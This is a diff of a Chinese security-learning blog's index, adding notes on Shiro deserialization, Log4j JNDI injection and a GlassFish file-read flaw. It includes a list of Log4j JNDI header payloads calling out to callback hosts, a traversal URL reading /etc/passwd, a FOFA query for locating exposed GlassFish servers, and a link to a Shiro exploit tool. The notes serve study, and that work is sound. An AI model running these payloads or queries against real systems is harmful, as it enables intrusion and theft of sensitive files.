@@ -367,6 +367,111 @@
       </tags>
   </entry>
   <entry>
+    <title>shiro反序列化漏洞</title>
+    <url>/2022/12/13/13-29-51/</url>
+    <content><![CDATA[<h1 id="Shrio反序列化导致命令执行"><a href="#Shrio反序列化导致命令执行" class="headerlink" title="Shrio反序列化导致命令执行"></a>Shrio<a href="https://so.csdn.net/so/search?q=%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&spm=1001.2101.3001.7020">反序列化</a>导致命令执行</h1><h2 id="漏洞编号：CVE-2016-4437"><a href="#漏洞编号：CVE-2016-4437" class="headerlink" title="漏洞编号：CVE-2016-4437"></a>漏洞编号：CVE-2016-4437</h2><h2 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h2><p><a href="https://blog.csdn.net/Aaron_Miller/article/details/106475088"> Shiro反序列化漏洞_風月长情的博客-CSDN博客_shiro反序列化漏洞</a></p>
+<h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>  Apache Shiro是一款开源企业常见JAVA安全框架，提供身份验证、授权、密码学和会话管理。java中的权限框架有SpringSecurity和Shiro，由于Spring功能强大但复杂，Shiro的简单强大，扩展性好因此用的还是很多。</p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Apache Shiro &lt; 1.2.4</p>
+<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>  Apache Shiro框架提供了记住我的功能（RememberMe），用户登录成功后会生成经过加密并编码的cookie。cookie的key为RememberMe，cookie的值是经过相关信息进行序列化，然后使用AES加密（对称），最后再使用Base64编码处理。服务端在接收cookie时：</p>
+<p>1.检索RememberMe Cookie的值<br>2.Base 64解码<br>3.AES解密（加密密钥硬编码）<br>4.进行反序列化操作（未过滤处理）</p>
+<p>攻击者可以使用Shiro的默认密钥构造恶意序列化对象进行编码来伪造用户的Cookie，服务端反序列化时触发漏洞，从而执行命令。</p>
+<h2 id="漏洞特征"><a href="#漏洞特征" class="headerlink" title="漏洞特征:"></a>漏洞特征:</h2><p>最主要的特征就是登录返回包中含有<strong>rememberMe=deleteMe</strong>字段</p>
+<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221213141911.png"></p>
+<p>准备充足在搞,先做好在本地复现的准备,安全第一</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用:"></a>漏洞利用:</h2><p>1.一键利用工具：</p>
+<p>链接：<a href="https://pan.baidu.com/s/1kvQEMrMP-PZ4K1eGwAP0_Q?pwd=zbgp">https://pan.baidu.com/s/1kvQEMrMP-PZ4K1eGwAP0_Q?pwd=zbgp</a><br>提取码：zbgp</p>
+<p><img src="/imgs/$%7Bfiilename%7D/image-20221213144910895.png" alt="image-20221213144910895"></p>
+<p>工具使用：<a href="https://www.iculture.cc/forum-post/17719.html">加强版图形界面shiro反序列化漏洞利用工具 shiro_attack-网络攻防学习社区-安全圈子-FancyPig’s blog (iculture.cc)</a></p>
+]]></content>
+      <categories>
+        <category>RCE</category>
+      </categories>
+      <tags>
+        <tag>漏洞库</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>log4j漏洞分析及总结</title>
+    <url>/2022/12/11/11-12-28/</url>
+    <content><![CDATA[<h1 id="log4j漏洞分析及总结"><a href="#log4j漏洞分析及总结" class="headerlink" title="log4j漏洞分析及总结"></a>log4j漏洞分析及总结</h1><h2 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h2><p><a href="https://mp.weixin.qq.com/s/4MnOQGg7LBYCUE7BuuGfEQ">核弹级漏洞！我把log4j扒给你看！ (qq.com)</a></p>
+<p><a href="https://blog.csdn.net/Koikoi12/article/details/121906895"> log4j漏洞成因和原理（JNDI和LDAP）_Koikoi123的博客-CSDN博客_log4j原理</a></p>
+<p>（看完文章让我想起了PHPmyadmin里的全局日志文件写入shell这也是通过日志手段的漏洞应用：<a href="https://www.wanheiqiyihu.top/articles/162%EF%BC%89">https://www.wanheiqiyihu.top/articles/162）</a></p>
+<h2 id="log4j漏洞产生原因"><a href="#log4j漏洞产生原因" class="headerlink" title="log4j漏洞产生原因"></a>log4j漏洞产生原因</h2><p>原因概括为：在使用java日志输出框架log4j2时其中的JNDI lookup（Java允许通过JNDI远程去下载一个class文件来加载对象）对请求字符的合法性限制不足导致的远程代码执行。</p>
+<h1 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h1><p>不管是什么编程语言，不管是前端后端还是客户端，对<strong>打日志</strong>都不会陌生。</p>
+<p>通过日志，可以帮助我们了解程序的运行情况，排查程序运行中出现的问题。</p>
+<p>在Java技术栈中，用的比较多的日志输出框架主要是<strong>log4j2</strong>和<strong>logback</strong>。</p>
+<p>我们经常会在日志中输出一些变量，比如：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">logger.info(&quot;client ip: &#123;&#125;&quot;, clientIp)</span><br></pre></td></tr></table></figure>
+
+<p>现在思考一个问题：</p>
+<p>假如现在想要通过日志输出一个Java对象，但这个对象不在程序中，而是在其他地方，比如可能在某个文件中，甚至可能在网络上的某个地方，这种时候怎么办呢？</p>
+<p>log4j2的强大之处在于，除了可以输出程序中的变量，它还提供了一个叫<strong>Lookup</strong>的东西，可以用来输出更多内容：</p>
+<p><img src="/imgs/$%7Bfiilename%7D/640.png"></p>
+<p>如图所示，lookups最主要的功能就是查找，在log4j2中允许在输出日志的时候，通过某种方式去查找要输出的内容。</p>
+<p>log4j2中已经帮我们把常见的查找途径已经实现了，lookup相当于是一个接口，具体去哪里查找，怎么查找，就要靠我们去调用查找功能的模块了。</p>
+<p>log4j2常见的查找途径：</p>
+<p><img src="/imgs/$%7Bfiilename%7D/640%20(1).png"></p>
+<h2 id="JNDI协议："><a href="#JNDI协议：" class="headerlink" title="JNDI协议："></a>JNDI协议：</h2><p>JNDI即<code>Java Naming and Directory Interface</code>（JAVA命名和目录接口），它提供一个目录系统，并将服务名称与对象关联起来，从而使得开发人员在开发过程中可以使用名称来访问对象。</p>
+<p>简单粗暴理解：有一个类似于字典的数据源，你可以通过JNDI接口，传一个name进去，就能获取到对象了。</p>
+<p>那不同的数据源肯定有不同的查找方式，所以JNDI也只是一个上层封装，在它下面也支持很多种具体的数据源。</p>
+<p><img src="/imgs/$%7Bfiilename%7D/640%20(2).png"></p>
+<h2 id="LDAP协议：（用在统一身份认证领域比较多）"><a href="#LDAP协议：（用在统一身份认证领域比较多）" class="headerlink" title="LDAP协议：（用在统一身份认证领域比较多）"></a>LDAP协议：（用在统一身份认证领域比较多）</h2><p>LDAP即<code>Lightweight Directory Access Protocol</code>（轻量级目录访问协议），目录是一个为查询、浏览和搜索而优化的专业分布式数据库，它呈树状结构组织数据，就好象Linux/Unix系统中的文件目录一样。目录数据库和关系数据库不同，它有优异的读性能，但写性能差，并且没有事务处理、回滚等复杂功能，不适于存储修改频繁的数据。所以目录天生是用来查询的，就好像它的名字一样。</p>
+<p><strong>简单粗暴理解</strong>：有一个类似于字典的数据源，你可以通过LDAP协议，传一个name进去，就能获取到数据。</p>
+<h2 id="恶意JNDI注入攻击："><a href="#恶意JNDI注入攻击：" class="headerlink" title="恶意JNDI注入攻击："></a>恶意JNDI注入攻击：</h2><p>此攻击是log4j漏洞攻击点之一</p>
+<p>网络安全中有一个准则：<strong>不要信任用户输入的任何信息</strong>。（黑客攻击点，未限制的字符输入会导致多种漏洞存在）</p>
+<p>假如某一个Java程序中，将浏览器的类型记录到了日志中：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">String userAgent = request.getHeader(&quot;User-Agent&quot;);</span><br><span class="line">logger.info(userAgent);</span><br></pre></td></tr></table></figure>
+
+<p>这其中，<code>User-Agent</code>就属于外界输入的信息，而不是自己程序里定义出来的。只要是外界输入的，就有可能存在恶意的内容。</p>
+<p>假如有人发来了一个HTTP请求，他的<code>User-Agent</code>是这样一个字符串：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;jndi:ldap://127.0.0.1/exploit&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>接下来，log4j2将会对这行要输出的字符串进行解析。</p>
+<p>首先，它发现了字符串中有 **${}**，知道这个里面包裹的内容是要单独处理的。</p>
+<p>进一步解析，发现是JNDI扩展内容。</p>
+<p>再进一步解析，发现了是LDAP协议，LDAP服务器在127.0.0.1，要查找的key是exploit。</p>
+<p>最后，调用具体负责LDAP的模块去请求对应的数据。</p>
+<p>如果只是请求普通的数据，那也没什么，但问题就出在还可以请求Java对象！</p>
+<p>Java对象一般只存在于内存中，但也可以通过序列化的方式将其存储到文件中，或者通过网络传输。</p>
+<p>如果是自己定义的序列化方式也还好，但更危险的在于：JNDI还支持一个叫命名引用（Naming References）的方式，可以通过远程下载一个class文件，然后下载后加载起来构建对象。</p>
+<blockquote>
+<p>PS：有时候Java对象比较大，直接通过LDAP这些存储不方便，就整了个类似于二次跳转的意思，不直接返回对象内容，而是告诉你对象在哪个class里，让你去那里找。</p>
+</blockquote>
+<p>注意，这里就是核心问题了：<strong>JNDI可以远程下载class文件来构建对象！！！</strong>。</p>
+<p>危险在哪里？</p>
+<p>如果远程下载的URL指向的是一个黑客的服务器，并且下载的class文件里面藏有恶意代码，恶意代码执行后这就是一次恶意的远程代码执行攻击.</p>
+<p><img src="/imgs/$%7Bfiilename%7D/640%20(3).png"></p>
+<p>这就是鼎鼎大名的JNDI注入攻击！</p>
+<p>其实除了LDAP，还有RMI的方式，</p>
+<p>**核心在于:**Java允许通过JNDI远程去下载一个class文件来加载对象</p>
+<p>JNVDI注入拓展:<a href="https://kingx.me/Exploit-Java-Deserialization-with-RMI.html">深入理解JNDI注入与Java反序列化漏洞利用 – KINGX</a></p>
+<h1 id="漏洞验证与复现"><a href="#漏洞验证与复现" class="headerlink" title="漏洞验证与复现:"></a>漏洞验证与复现:</h1><h2 id="log4j-payload"><a href="#log4j-payload" class="headerlink" title="log4j payload:"></a>log4j payload:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">X-Client-IP: $&#123;jndi:ldap://1644763261510dpicz.zdl7qs.ceye.io/VXBQo&#125;</span><br><span class="line">X-Remote-IP: $&#123;jndi:ldap://1644763261510jnabe.zdl7qs.ceye.io/vl&#125;</span><br><span class="line">X-Remote-Addr: $&#123;jndi:ldap://1644763261510xplnj.zdl7qs.ceye.io/hTE&#125;</span><br><span class="line">X-Forwarded-For: $&#123;jndi:ldap://1644763261510lbnhl.zdl7qs.ceye.io/hvgsw&#125;</span><br><span class="line">X-Originating-IP: $&#123;jndi:ldap://1644763261510pbhdy.zdl7qs.ceye.io/LxrC&#125;</span><br><span class="line">True-Client-IP: $&#123;jndi:rmi://1644763261510jjchm.zdl7qs.ceye.io/FrfXm&#125;</span><br><span class="line">Originating-IP: $&#123;jndi:rmi://1644763261510jctho.zdl7qs.ceye.io/vbP&#125;</span><br><span class="line">X-Real-IP: $&#123;jndi:rmi://1644763261510fyvxt.zdl7qs.ceye.io/fWmjt&#125;</span><br><span class="line">Client-IP: $&#123;jndi:rmi://1644763261510nfaoa.zdl7qs.ceye.io/mS&#125;</span><br><span class="line">X-Api-Version: $&#123;jndi:rmi://1644763261510daeem.zdl7qs.ceye.io/IdJ&#125;</span><br><span class="line">Sec-Ch-Ua: $&#123;jndi:dns://1644763261510wjiit.zdl7qs.ceye.io/IX&#125;</span><br><span class="line">Sec-Ch-Ua-Platform: $&#123;jndi:dns://1644763261510dacbb.zdl7qs.ceye.io/ftA&#125;</span><br><span class="line">Sec-Fetch-Site: $&#123;jndi:dns://1644763261510rypwe.zdl7qs.ceye.io/asWuD&#125;</span><br><span class="line">Sec-Fetch-Mode: $&#123;jndi:dns://1644763261510osrig.zdl7qs.ceye.io/zc&#125;</span><br><span class="line">Sec-Fetch-User: $&#123;jndi:dns://1644763261510uvfsl.zdl7qs.ceye.io/oNpOs&#125;</span><br><span class="line">Sec-Fetch-Dest: $&#123;jndi:dns://1644763261510ptqen.zdl7qs.ceye.io/fGwFl&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>以及一些变形的payload:</p>
+<p><img src="/imgs/$%7Bfiilename%7D/bf3e6d12124a407484a9a9cc1b87280d.png"></p>
+<p>这些payload的形式大多类似与这样：<br><code>$&#123;jndi:ldap://xxxx.com.cn&#125;</code>,</p>
+<p>在上文中我们了解到log4j漏洞点主要是JNDI协议下的未限制访问下载class类,所以以这些payload的形式来看更能证述我们上文的解释.</p>
+<p>payload构造一个远程访问请求返回攻击者服务器上的恶意class.如果恶意class中的恶意代码成功执行,将使受害机遭到攻击.</p>
+<p>log4j2的使用面广泛，除以Java技术为主的公司外，还有一些大量中间件都是用Java开发的，如：kafka、elasticsearch、flink</p>
+<p>（或许可以了解一下这些中间件，万一可以捡漏呢）</p>
+<p>修复：</p>
+<p>新版的log4j2在JNDI lookup中增加了很多限制彻底封锁了通过打印日志去远程加载class的这条路：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.默认不再支持二次跳转（也就是命名引用）的方式获取对象</span><br><span class="line">2.只有在log4j2.allowedLdapClasses列表中指定的class才能获取。</span><br><span class="line">3.只有远程地址是本地地址或者在log4j2.allowedLdapHosts列表中指定的地址才能获取</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="复现"><a href="#复现" class="headerlink" title="复现:"></a>复现:</h2><p>待定……..</p>
+]]></content>
+      <categories>
+        <category>RCE</category>
+      </categories>
+      <tags>
+        <tag>漏洞库</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>vlunhub-tiki靶场</title>
     <url>/2022/11/02/17-48-47/</url>
     <content><![CDATA[<h1 id="vlunhub-tiki靶场（简单）"><a href="#vlunhub-tiki靶场（简单）" class="headerlink" title="vlunhub-tiki靶场（简单）"></a>vlunhub-tiki靶场（简单）</h1><h1 id="首先是遇到的问题"><a href="#首先是遇到的问题" class="headerlink" title="首先是遇到的问题"></a>首先是遇到的问题</h1><p>整次打靶过程可以说很顺利，可以很快速的达到自己想要的目的，但最重要的一点就是语言不通，进入后台后一直找不到ssh账号密码存在点，如果是实际渗透测试，可能花费的时间会更多。</p>
@@ -549,6 +654,17 @@
       </tags>
   </entry>
   <entry>
+    <title>内网学习笔记</title>
+    <url>/2022/10/19/10-49-13/</url>
+    <content><![CDATA[<h1 id="内网学习记录"><a href="#内网学习记录" class="headerlink" title="内网学习记录"></a>内网学习记录</h1>]]></content>
+      <categories>
+        <category>内网</category>
+      </categories>
+      <tags>
+        <tag>内网学习</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>web基础</title>
     <url>/2022/10/17/17-43-58/</url>
     <content><![CDATA[<h1 id="总结一下到目前所学的基础知识"><a href="#总结一下到目前所学的基础知识" class="headerlink" title="总结一下到目前所学的基础知识:"></a>总结一下到目前所学的基础知识:</h1><p>大概涉及很多方面但涉及到的深入一点的也会另开新卷详细描述</p>
@@ -708,17 +824,6 @@
       </tags>
   </entry>
   <entry>
-    <title>内网学习笔记</title>
-    <url>/2022/10/19/10-49-13/</url>
-    <content><![CDATA[<h1 id="内网学习记录"><a href="#内网学习记录" class="headerlink" title="内网学习记录"></a>内网学习记录</h1>]]></content>
-      <categories>
-        <category>内网</category>
-      </categories>
-      <tags>
-        <tag>内网学习</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>博客文章编写方式</title>
     <url>/2022/10/15/17-58-19/</url>
     <content><![CDATA[<h1 id="你好"><a href="#你好" class="headerlink" title="你好"></a>你好</h1><h2 id="博客的创建方式是先"><a href="#博客的创建方式是先" class="headerlink" title="博客的创建方式是先"></a>博客的创建方式是先</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo new &quot;文章主题&quot;</span><br><span class="line">然后去文件地址编辑</span><br><span class="line">编辑好后</span><br><span class="line">再</span><br><span class="line">hexo c</span><br><span class="line">hexo g</span><br><span class="line">hexo s</span><br><span class="line">上传到github是</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure>
@@ -760,30 +865,6 @@
       </categories>
       <tags>
         <tag>hexo博客搭建说明</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>应用服务器glassfish任意文件读取漏洞</title>
-    <url>/2022/11/13/15-34-05/</url>
-    <content><![CDATA[<h1 id="应用服务器glassfish任意文件读取漏洞"><a href="#应用服务器glassfish任意文件读取漏洞" class="headerlink" title="应用服务器glassfish任意文件读取漏洞"></a>应用服务器glassfish任意文件读取漏洞</h1><h2 id="漏洞编号：wooyun-2010-0144595"><a href="#漏洞编号：wooyun-2010-0144595" class="headerlink" title="漏洞编号：wooyun-2010-0144595"></a>漏洞编号：wooyun-2010-0144595</h2><h2 id="影响版本-glass-fish4-0至4-1这两个大版本"><a href="#影响版本-glass-fish4-0至4-1这两个大版本" class="headerlink" title="影响版本:  glass fish4.0至4.1这两个大版本"></a>影响版本:  glass fish4.0至4.1这两个大版本</h2><h2 id="漏洞利用："><a href="#漏洞利用：" class="headerlink" title="漏洞利用："></a>漏洞利用：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost:4848/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd</span><br></pre></td></tr></table></figure>
-
-<p>该漏洞标题写的是任意文件读取漏洞，其实该漏洞同样可以列出对应目录文件，基本上等同于源代码泄露，各种敏感信息暴露无遗。</p>
-<p>该漏洞分为windows和linux 系统</p>
-<p>4848端口为glassfish默认开放的web管理端口</p>
-<p>使用%c0%ae%c0%ae/这一个java中的特殊方式可直接跳转目录，获得目录文件列表。</p>
-<p>读取web应用配置文件，如（web.xml,数据库配置文件，web系统日志）等敏感文件;</p>
-<p>针对特定的文件可进一步读取其内容。</p>
-<p>fofa搜索语句:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;glassfish &quot; &amp;&amp; &quot;4.0&quot; &amp;&amp; port=&quot;4848&quot;</span><br></pre></td></tr></table></figure>
-
-<p>虽然是几年前的了,但到目前了影响的公司,漏洞存在的公司还是有很多滴.</p>
-<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221108125019-1668327385931.png"></p>
-]]></content>
-      <categories>
-        <category>任意文件读取</category>
-      </categories>
-      <tags>
-        <tag>漏洞库</tag>
       </tags>
   </entry>
   <entry>
@@ -1014,108 +1095,56 @@
       </tags>
   </entry>
   <entry>
-    <title>log4j漏洞分析及总结</title>
-    <url>/2022/12/11/11-12-28/</url>
-    <content><![CDATA[<h1 id="log4j漏洞分析及总结"><a href="#log4j漏洞分析及总结" class="headerlink" title="log4j漏洞分析及总结"></a>log4j漏洞分析及总结</h1><h2 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h2><p><a href="https://mp.weixin.qq.com/s/4MnOQGg7LBYCUE7BuuGfEQ">核弹级漏洞！我把log4j扒给你看！ (qq.com)</a></p>
-<p><a href="https://blog.csdn.net/Koikoi12/article/details/121906895"> log4j漏洞成因和原理（JNDI和LDAP）_Koikoi123的博客-CSDN博客_log4j原理</a></p>
-<p>（看完文章让我想起了PHPmyadmin里的全局日志文件写入shell这也是通过日志手段的漏洞应用：<a href="https://www.wanheiqiyihu.top/articles/162%EF%BC%89">https://www.wanheiqiyihu.top/articles/162）</a></p>
-<h2 id="log4j漏洞产生原因"><a href="#log4j漏洞产生原因" class="headerlink" title="log4j漏洞产生原因"></a>log4j漏洞产生原因</h2><p>原因概括为：在使用java日志输出框架log4j2时其中的JNDI lookup（Java允许通过JNDI远程去下载一个class文件来加载对象）对请求字符的合法性限制不足导致的远程代码执行。</p>
-<h1 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h1><p>不管是什么编程语言，不管是前端后端还是客户端，对<strong>打日志</strong>都不会陌生。</p>
-<p>通过日志，可以帮助我们了解程序的运行情况，排查程序运行中出现的问题。</p>
-<p>在Java技术栈中，用的比较多的日志输出框架主要是<strong>log4j2</strong>和<strong>logback</strong>。</p>
-<p>我们经常会在日志中输出一些变量，比如：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">logger.info(&quot;client ip: &#123;&#125;&quot;, clientIp)</span><br></pre></td></tr></table></figure>
+    <title>应用服务器glassfish任意文件读取漏洞</title>
+    <url>/2022/11/13/15-34-05/</url>
+    <content><![CDATA[<h1 id="应用服务器glassfish任意文件读取漏洞"><a href="#应用服务器glassfish任意文件读取漏洞" class="headerlink" title="应用服务器glassfish任意文件读取漏洞"></a>应用服务器glassfish任意文件读取漏洞</h1><h2 id="漏洞编号：wooyun-2010-0144595"><a href="#漏洞编号：wooyun-2010-0144595" class="headerlink" title="漏洞编号：wooyun-2010-0144595"></a>漏洞编号：wooyun-2010-0144595</h2><h2 id="影响版本-glass-fish4-0至4-1这两个大版本"><a href="#影响版本-glass-fish4-0至4-1这两个大版本" class="headerlink" title="影响版本:  glass fish4.0至4.1这两个大版本"></a>影响版本:  glass fish4.0至4.1这两个大版本</h2><h2 id="漏洞利用："><a href="#漏洞利用：" class="headerlink" title="漏洞利用："></a>漏洞利用：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost:4848/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd</span><br></pre></td></tr></table></figure>
 
-<p>现在思考一个问题：</p>
-<p>假如现在想要通过日志输出一个Java对象，但这个对象不在程序中，而是在其他地方，比如可能在某个文件中，甚至可能在网络上的某个地方，这种时候怎么办呢？</p>
-<p>log4j2的强大之处在于，除了可以输出程序中的变量，它还提供了一个叫<strong>Lookup</strong>的东西，可以用来输出更多内容：</p>
-<p><img src="/imgs/$%7Bfiilename%7D/640.png"></p>
-<p>如图所示，lookups最主要的功能就是查找，在log4j2中允许在输出日志的时候，通过某种方式去查找要输出的内容。</p>
-<p>log4j2中已经帮我们把常见的查找途径已经实现了，lookup相当于是一个接口，具体去哪里查找，怎么查找，就要靠我们去调用查找功能的模块了。</p>
-<p>log4j2常见的查找途径：</p>
-<p><img src="/imgs/$%7Bfiilename%7D/640%20(1).png"></p>
-<h2 id="JNDI协议："><a href="#JNDI协议：" class="headerlink" title="JNDI协议："></a>JNDI协议：</h2><p>JNDI即<code>Java Naming and Directory Interface</code>（JAVA命名和目录接口），它提供一个目录系统，并将服务名称与对象关联起来，从而使得开发人员在开发过程中可以使用名称来访问对象。</p>
-<p>简单粗暴理解：有一个类似于字典的数据源，你可以通过JNDI接口，传一个name进去，就能获取到对象了。</p>
-<p>那不同的数据源肯定有不同的查找方式，所以JNDI也只是一个上层封装，在它下面也支持很多种具体的数据源。</p>
-<p><img src="/imgs/$%7Bfiilename%7D/640%20(2).png"></p>
-<h2 id="LDAP协议：（用在统一身份认证领域比较多）"><a href="#LDAP协议：（用在统一身份认证领域比较多）" class="headerlink" title="LDAP协议：（用在统一身份认证领域比较多）"></a>LDAP协议：（用在统一身份认证领域比较多）</h2><p>LDAP即<code>Lightweight Directory Access Protocol</code>（轻量级目录访问协议），目录是一个为查询、浏览和搜索而优化的专业分布式数据库，它呈树状结构组织数据，就好象Linux/Unix系统中的文件目录一样。目录数据库和关系数据库不同，它有优异的读性能，但写性能差，并且没有事务处理、回滚等复杂功能，不适于存储修改频繁的数据。所以目录天生是用来查询的，就好像它的名字一样。</p>
-<p><strong>简单粗暴理解</strong>：有一个类似于字典的数据源，你可以通过LDAP协议，传一个name进去，就能获取到数据。</p>
-<h2 id="恶意JNDI注入攻击："><a href="#恶意JNDI注入攻击：" class="headerlink" title="恶意JNDI注入攻击："></a>恶意JNDI注入攻击：</h2><p>此攻击是log4j漏洞攻击点之一</p>
-<p>网络安全中有一个准则：<strong>不要信任用户输入的任何信息</strong>。（黑客攻击点，未限制的字符输入会导致多种漏洞存在）</p>
-<p>假如某一个Java程序中，将浏览器的类型记录到了日志中：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">String userAgent = request.getHeader(&quot;User-Agent&quot;);</span><br><span class="line">logger.info(userAgent);</span><br></pre></td></tr></table></figure>
+<p>该漏洞标题写的是任意文件读取漏洞，其实该漏洞同样可以列出对应目录文件，基本上等同于源代码泄露，各种敏感信息暴露无遗。</p>
+<p>该漏洞分为windows和linux 系统</p>
+<p>4848端口为glassfish默认开放的web管理端口</p>
+<p>使用%c0%ae%c0%ae/这一个java中的特殊方式可直接跳转目录，获得目录文件列表。</p>
+<p>读取web应用配置文件，如（web.xml,数据库配置文件，web系统日志）等敏感文件;</p>
+<p>针对特定的文件可进一步读取其内容。</p>
+<p>fofa搜索语句:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;glassfish &quot; &amp;&amp; &quot;4.0&quot; &amp;&amp; port=&quot;4848&quot;</span><br></pre></td></tr></table></figure>
 
-<p>这其中，<code>User-Agent</code>就属于外界输入的信息，而不是自己程序里定义出来的。只要是外界输入的，就有可能存在恶意的内容。</p>
-<p>假如有人发来了一个HTTP请求，他的<code>User-Agent</code>是这样一个字符串：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;jndi:ldap://127.0.0.1/exploit&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>接下来，log4j2将会对这行要输出的字符串进行解析。</p>
-<p>首先，它发现了字符串中有 **${}**，知道这个里面包裹的内容是要单独处理的。</p>
-<p>进一步解析，发现是JNDI扩展内容。</p>
-<p>再进一步解析，发现了是LDAP协议，LDAP服务器在127.0.0.1，要查找的key是exploit。</p>
-<p>最后，调用具体负责LDAP的模块去请求对应的数据。</p>
-<p>如果只是请求普通的数据，那也没什么，但问题就出在还可以请求Java对象！</p>
-<p>Java对象一般只存在于内存中，但也可以通过序列化的方式将其存储到文件中，或者通过网络传输。</p>
-<p>如果是自己定义的序列化方式也还好，但更危险的在于：JNDI还支持一个叫命名引用（Naming References）的方式，可以通过远程下载一个class文件，然后下载后加载起来构建对象。</p>
-<blockquote>
-<p>PS：有时候Java对象比较大，直接通过LDAP这些存储不方便，就整了个类似于二次跳转的意思，不直接返回对象内容，而是告诉你对象在哪个class里，让你去那里找。</p>
-</blockquote>
-<p>注意，这里就是核心问题了：<strong>JNDI可以远程下载class文件来构建对象！！！</strong>。</p>
-<p>危险在哪里？</p>
-<p>如果远程下载的URL指向的是一个黑客的服务器，并且下载的class文件里面藏有恶意代码，恶意代码执行后这就是一次恶意的远程代码执行攻击.</p>
-<p><img src="/imgs/$%7Bfiilename%7D/640%20(3).png"></p>
-<p>这就是鼎鼎大名的JNDI注入攻击！</p>
-<p>其实除了LDAP，还有RMI的方式，</p>
-<p>**核心在于:**Java允许通过JNDI远程去下载一个class文件来加载对象</p>
-<p>JNVDI注入拓展:<a href="https://kingx.me/Exploit-Java-Deserialization-with-RMI.html">深入理解JNDI注入与Java反序列化漏洞利用 – KINGX</a></p>
-<h1 id="漏洞验证与复现"><a href="#漏洞验证与复现" class="headerlink" title="漏洞验证与复现:"></a>漏洞验证与复现:</h1><h2 id="log4j-payload"><a href="#log4j-payload" class="headerlink" title="log4j payload:"></a>log4j payload:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">X-Client-IP: $&#123;jndi:ldap://1644763261510dpicz.zdl7qs.ceye.io/VXBQo&#125;</span><br><span class="line">X-Remote-IP: $&#123;jndi:ldap://1644763261510jnabe.zdl7qs.ceye.io/vl&#125;</span><br><span class="line">X-Remote-Addr: $&#123;jndi:ldap://1644763261510xplnj.zdl7qs.ceye.io/hTE&#125;</span><br><span class="line">X-Forwarded-For: $&#123;jndi:ldap://1644763261510lbnhl.zdl7qs.ceye.io/hvgsw&#125;</span><br><span class="line">X-Originating-IP: $&#123;jndi:ldap://1644763261510pbhdy.zdl7qs.ceye.io/LxrC&#125;</span><br><span class="line">True-Client-IP: $&#123;jndi:rmi://1644763261510jjchm.zdl7qs.ceye.io/FrfXm&#125;</span><br><span class="line">Originating-IP: $&#123;jndi:rmi://1644763261510jctho.zdl7qs.ceye.io/vbP&#125;</span><br><span class="line">X-Real-IP: $&#123;jndi:rmi://1644763261510fyvxt.zdl7qs.ceye.io/fWmjt&#125;</span><br><span class="line">Client-IP: $&#123;jndi:rmi://1644763261510nfaoa.zdl7qs.ceye.io/mS&#125;</span><br><span class="line">X-Api-Version: $&#123;jndi:rmi://1644763261510daeem.zdl7qs.ceye.io/IdJ&#125;</span><br><span class="line">Sec-Ch-Ua: $&#123;jndi:dns://1644763261510wjiit.zdl7qs.ceye.io/IX&#125;</span><br><span class="line">Sec-Ch-Ua-Platform: $&#123;jndi:dns://1644763261510dacbb.zdl7qs.ceye.io/ftA&#125;</span><br><span class="line">Sec-Fetch-Site: $&#123;jndi:dns://1644763261510rypwe.zdl7qs.ceye.io/asWuD&#125;</span><br><span class="line">Sec-Fetch-Mode: $&#123;jndi:dns://1644763261510osrig.zdl7qs.ceye.io/zc&#125;</span><br><span class="line">Sec-Fetch-User: $&#123;jndi:dns://1644763261510uvfsl.zdl7qs.ceye.io/oNpOs&#125;</span><br><span class="line">Sec-Fetch-Dest: $&#123;jndi:dns://1644763261510ptqen.zdl7qs.ceye.io/fGwFl&#125;</span><br><span 